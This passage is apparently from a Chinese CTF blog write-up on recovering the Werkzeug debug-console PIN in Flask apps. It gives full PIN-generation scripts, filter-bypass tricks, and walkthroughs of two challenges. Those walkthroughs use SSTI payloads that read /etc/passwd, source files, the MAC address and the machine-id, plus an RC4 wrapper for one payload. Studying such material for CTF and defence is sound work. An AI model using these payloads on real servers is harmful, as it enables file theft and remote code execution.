<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第一部分</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,  <span class="comment">#服务器运行flask所登录的用户名，username。</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># appname</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment">#flask库下app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line">username：通过getpass.getuser()读取，通过文件读取/etc/passwd，可能为root，到时候具体看，不行就每个用户名都试试</span><br><span class="line">modname：通过<span class="built_in">getattr</span>(mod,“file”,<span class="literal">None</span>)读取，默认值为flask.app</span><br><span class="line">appname：通过<span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>))读取，默认值为Flask</span><br><span class="line">第四个参数：<span class="built_in">getattr</span>(mod, <span class="string">&#x27;__file__&#x27;</span>, <span class="literal">None</span>),或通过报错得到，但是需要注意的是，python3是app.py，python2是app.pyc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二部分</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>, <span class="comment">#当前网络的mac地址的十进制数 &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;#机器的id</span></span><br><span class="line">]</span><br><span class="line">十进制数的原始数的获得其中可以在/sys/<span class="keyword">class</span>/net/eth0/address 获取(eth0为网卡名)</span><br><span class="line"></span><br><span class="line">对于非docker机每一个机器都会有自已唯一的<span class="built_in">id</span>：</span><br><span class="line">machine_id由三个合并（docker就后两个）：</span><br><span class="line"><span class="number">1.</span> /etc/machine-<span class="built_in">id</span>（docker环境下不用读这个，直接拼接后面两个即可）</span><br><span class="line"><span class="number">2.</span>/proc/sys/kernel/random/boot_id（有boot-<span class="built_in">id</span>那就拼接boot-<span class="built_in">id</span>）</span><br><span class="line"><span class="number">3.</span>/proc/self/cgroup（截取最后一个斜杠后面的内容）</span><br><span class="line"><span class="comment"># 例如：name=systemd:/docker/2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8</span></span><br><span class="line"><span class="comment"># 则只截取2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8拼接到后面</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于文件里的mac地址一般为十六进制并且有<code>:</code>分别，可以使用如下脚本直接生成十进制的数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义原始的十六进制字符串，其中包含冒号</span></span><br><span class="line">a = <span class="string">&quot;a2:89:2e:1f:6a:8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用replace函数移除字符串中的所有冒号</span></span><br><span class="line">b = a.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用int函数将十六进制字符串转换为十进制整数</span></span><br><span class="line"><span class="comment"># int函数的第一个参数是要转换的字符串</span></span><br><span class="line"><span class="comment"># 第二个参数是字符串的进制，这里为16表示十六进制</span></span><br><span class="line">resault = <span class="built_in">int</span>(b, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印出转换后的十进制数值</span></span><br><span class="line"><span class="built_in">print</span>(resault)</span><br></pre></td></tr></table></figure>

<p>获得pin码后，只要开启了debug模式，就可以访问调试模式下的特殊路由（&#x2F;console），即使没有设置过。</p>
<h4 id="不同版本算法区别"><a href="#不同版本算法区别" class="headerlink" title="不同版本算法区别"></a>不同版本算法区别</h4><p>3.6采用MD5加密，3.8采用sha1加密，现在基本高版本，所以脚本有所不同</p>
<p><strong>3.6 MD5</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span> <span class="comment">#读/etc/passwd</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><span class="comment">#报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p><strong>3.8 SHA1</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<h4 id="过滤相关"><a href="#过滤相关" class="headerlink" title="过滤相关"></a>过滤相关</h4><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><ol>
<li>**过滤<code>self</code>**：也就是<code>/proc/self/cgroup</code>没法用了，其实其中的<code>self</code>可以用相关进程的pid去替换，这里<code>1</code>就行，也就是<code>proc/1/cgroup</code></li>
<li>**过滤<code>cgroup</code>**：可以考虑<code>mountinfo</code>或者<code>cpuset</code>，同样可以结合上面那个<code>1</code>用。一般两个都ban的时候就直接使用<code>/proc/1/cpuset</code></li>
</ol>
<h3 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h3><h5 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h5><p>buu上可复现</p>
<p>开题即是base64加密与解密，有hint页面，在源代码处看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- PIN ---&gt;</span><br></pre></td></tr></table></figure>

<p>所以这道题应该是考的debug模式下利用PIN码进行任意命令执行，猜测合理在base64解密的时候可以进行文件读取，这里就尝试SSTI读取。</p>
<p>稍微测试了一下，过滤popen，import与os，找到一个读文件的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br><span class="line">这个也行：</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;但是这里用的上面那个</span><br></pre></td></tr></table></figure>

<p>加密后拿去解密页面解密出现如下：<br><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515085456897.png" alt="image-20240515085456897"></p>
<p>这里就可以知道username为<code>flaskweb</code>，</p>
<p>这是可以尝试读取flask框架的网页源代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以读到被html编码的源代码，将其解码并正常排版后为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request, flash, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;chr&quot;</span>, <span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;commands&quot;</span>, <span class="string">&quot;socket&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>, txt=txt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>):</span><br><span class="line">        text = request.values.get(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res = render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;加密&quot;</span>, img=<span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>):</span><br><span class="line">        text = request.values.get(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp):</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res = render_template_string(tmp)</span><br><span class="line">        flash(res)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;解密&quot;</span>, img=<span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到黑名单以及确实可以利用ssti。</p>
<p>然后现在就是读取其他几个要素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">随便输入报错得到/usr/local/lib/python3.7/site-packages/flask/app.py</span><br></pre></td></tr></table></figure>

<p>mac值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后利用</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/sys/class/net/eth0/address&quot;).read()&#125;&#125;</span><br><span class="line">得到十六进制的a2:89:2e:1f:6a:8b</span><br><span class="line">再使用如下脚本将这个替换为十进制的数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_string = &quot;a2:89:2e:1f:6a:8b&quot;</span><br><span class="line">cleaned_hex_string = hex_string.replace(&quot;:&quot;, &quot;&quot;)</span><br><span class="line">decimal_value = int(cleaned_hex_string, 16)</span><br><span class="line">print(decimal_value)</span><br><span class="line"></span><br><span class="line">得到178710068030091</span><br></pre></td></tr></table></figure>

<p>最后获取机器id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同样利用这个读取</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/etc/machine-id&quot;).read()&#125;&#125;</span><br><span class="line">得到</span><br><span class="line">1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure>

<p>现在都有了，直接上生成pin码的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span> <span class="comment">#读/etc/passwd</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><span class="comment">#报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;178710068030091&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>生成<code>897-132-638</code>，</p>
<p>随后就再访问console页面并输入PIN码，如下获得flag</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515093557898.png" alt="image-20240515093557898"></p>
<h5 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h5><p>开题就<code>Welcome To Find Secret</code>，一番尝试后访问secret路由显示</p>
<p><code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
<p>，尝试get请求&#x2F;secret?secret&#x3D;12324报错</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113432443.png" alt="image-20240515113432443"></p>
<p>再输入secret&#x3D;1234，回显</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113505672.png" alt="image-20240515113505672"></p>
<p>访问一下console路由，确实存在debug调试模式</p>
<p>现在在报错页面看看部分源码，看到如下</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113700760.png" alt="image-20240515113700760"></p>
<p>应该存在ssti，看看附近代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"> rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line"> deS=rc.do_crypt(secret)</span><br><span class="line"> a=render_template_string(safe(deS)) </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"> <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>这里标记了一下解密，说明这里就是解密的过程，可以发现这里是rc4解密，结合刚进入这里的提示，会解密我传入的字符串，所以应该就是我传入的字符串需要rc4加密，并且这里可以知道密钥为<code>HereIsTreasure</code>，还可以看出这里有waf。</p>
<p>先给出大佬的rc4加密脚本,<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/#toc-5">文章</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是: %s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/proc/self/cgroup&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

